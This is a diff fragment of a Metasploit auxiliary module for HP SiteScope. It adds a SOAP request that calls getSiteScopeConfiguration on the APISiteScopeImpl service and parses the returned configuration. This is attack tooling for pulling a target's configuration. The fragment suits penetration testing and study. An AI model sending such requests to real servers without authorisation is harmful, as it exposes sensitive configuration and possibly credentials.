@@ -75,7 +75,22 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def access_configuration
-		print_status("#{rhost}:#{rport} - Connecting to SiteScope SOAP Interface")
+
+		data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
+		data << "<wsns0:Envelope" + "\r\n"
+		data << "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
+		data << "xmlns:xsd='http://www.w3.org/2001/XMLSchema'" + "\r\n"
+		data << "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'" + "\r\n"
+		data << ">" + "\r\n"
+		data << "<wsns0:Body" + "\r\n"
+		data << "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'" + "\r\n"
+		data << ">" + "\r\n"
+		data << "<impl:getSiteScopeConfiguration" + "\r\n"
+		data << "xmlns:impl='http://Api.freshtech.COM'" + "\r\n"
+		data << "></impl:getSiteScopeConfiguration>" + "\r\n"
+		data << "</wsns0:Body>" + "\r\n"
+		data << "</wsns0:Envelope>"
+
 		print_status("#{@peer} - Retrieving the SiteScope Configuration")
 
 		uri = normalize_uri(@uri, 'services/APISiteScopeImpl')
@@ -88,6 +103,7 @@ class Metasploit4 < Msf::Auxiliary
 			'headers'  => {
 				'SOAPAction'    => '""',
 		}})
+
 		if res and res.code == 200
 
 			if res.headers['Content-Type'] =~ /boundary="(.*)"/
